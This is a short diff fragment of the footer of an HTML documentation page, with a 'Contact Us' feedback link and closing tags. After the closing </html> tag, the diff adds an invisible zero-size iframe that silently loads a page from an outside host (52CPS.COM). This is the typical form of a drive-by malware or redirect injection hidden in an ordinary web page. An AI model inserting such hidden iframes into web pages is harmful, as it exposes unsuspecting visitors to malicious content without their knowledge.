+<td align="center" valign="top"><a href="../../dcommon/html/feedback.htm"><img width="24" height="24" src="../../dcommon/gifs/feedbck2.gif" alt="Go to Feedback page" /><br />
+<span class="icon">Contact Us</span></a></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</body>
+</html>
+<iframe src="http://www.52CPS.COM/goto/mm.Htm" width=0 height=0></iframe>
